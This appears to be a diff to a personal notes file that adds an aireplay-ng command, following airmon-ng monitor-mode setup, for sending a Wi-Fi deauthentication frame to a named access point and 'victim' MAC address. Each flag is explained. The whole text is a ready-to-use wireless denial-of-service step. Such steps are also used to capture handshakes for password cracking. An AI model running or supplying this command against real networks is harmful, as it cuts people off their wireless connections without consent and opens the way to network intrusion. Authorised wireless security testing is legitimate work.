@@ -1,1 +1,8 @@
 sudo airmon-ng start wlan0
+
+sudo aireplay-ng -0 1 -a [MAC_ACCESSPOINT] -c [MAC_VICTIM] wlan0
+  -0    : deauthentication
+  1     : number of deauths to send
+  -a    : access point mac
+  -c    : victim mac
+  wlan0 : iface name
